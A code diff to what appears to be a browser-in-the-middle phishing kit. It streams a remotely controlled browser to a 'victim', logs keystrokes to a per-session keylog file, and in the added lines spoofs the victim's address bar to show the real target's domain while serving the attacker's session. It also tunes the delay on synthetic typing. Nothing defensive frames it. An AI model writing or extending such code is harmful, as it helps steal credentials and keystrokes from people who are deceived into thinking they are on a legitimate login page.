@@ -283,6 +283,7 @@ async function get_browser(target_page){
   browser.victim_ip = ''
   browser.victim_target_id = ''
   browser.controller_socket = ''
+  browser.spoofed_domain = ''
   browser.keylog = ''
   browser.keylog_file = fs.createWriteStream(`./user_data/${browser_id}/keylog.txt`, {flags:'a'});
   browser.browser_id = browser_id
@@ -345,7 +346,16 @@ fastify.ready(async function(err){
       browser.target_page.on('framenavigated', function(frame){
         if(frame.parentFrame() === null) {
           if(browser.controller_socket !== undefined){
-            fastify.io.to(browser.controller_socket).emit('push_state', frame.url().split('/').slice(3).join('/'))
+            // Get the real URL from the target site
+            const realUrl = new URL(frame.url())
+            
+            // Use the stored spoofed domain (target domain) from when the victim connected
+            const spoofedDomain = browser.spoofed_domain || 'localhost:58082'
+            
+            // Construct spoofed URL: use target domain with real path/params so victim sees expected domain
+            const spoofedUrl = `https://${spoofedDomain}${realUrl.pathname}${realUrl.search}${realUrl.hash}`
+            
+            fastify.io.to(browser.controller_socket).emit('push_state', spoofedUrl)
           }
         }
       })
@@ -355,6 +365,11 @@ fastify.ready(async function(err){
       empty_phishbowl.victim_target_id = target_id
       empty_phishbowl.victim_width = viewport_width
       empty_phishbowl.victim_height = viewport_height
+      
+      // Extract target domain from the login_page URL for URL spoofing
+      const targetUrl = new URL(target.login_page)
+      empty_phishbowl.spoofed_domain = targetUrl.hostname
+      
       await resize_window(empty_phishbowl, empty_phishbowl.target_page, viewport_width, viewport_height)
       await empty_phishbowl.target_page.setViewport({width: viewport_width, height: viewport_height})
       empty_phishbowl.victim_socket = socket.id
@@ -468,7 +483,7 @@ fastify.ready(async function(err){
             text: char,
           })
           // Small delay to make it look more realistic (optional, can be removed for speed)
-          await new Promise(resolve => setTimeout(resolve, 10))
+          await new Promise(resolve => setTimeout(resolve, 4))
         }
       }
     })
